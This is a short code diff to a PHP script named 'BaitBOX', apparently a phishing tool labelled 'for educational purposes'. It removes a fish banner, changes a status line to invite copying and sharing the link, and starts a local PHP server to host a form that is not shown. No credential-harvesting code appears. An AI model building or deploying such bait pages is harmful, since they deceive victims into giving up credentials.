@@ -12,15 +12,12 @@ echo "\033[31m"; // Start reddish color
 system('toilet -f standard "BaitBOX"');
 echo "\033[0m"; // Reset color
 echo "\033[31mFor Educational Purposses Only\n\033[0m";
-// Print the fish image after "BaitBOX"
-$fish_img = "\033[34m><(((('>\033[0m\n"; // 34 is for blue
-echo $fish_img;
 // Start PHP's built-in server to host the form locally
 $host = "localhost";
 $port = 8000;
 
 echo "Starting server on http://$host:$port...\n";
-echo "Link Is Now Avaliable.\n\n";
+echo "\033[32mLink Is Now Avaliable Copy To Share.\n\n\033[0m";
 
 // Use shell_exec to start the PHP built-in server in the background
 shell_exec("php -S $host:$port > /dev/null 2>&1 &");
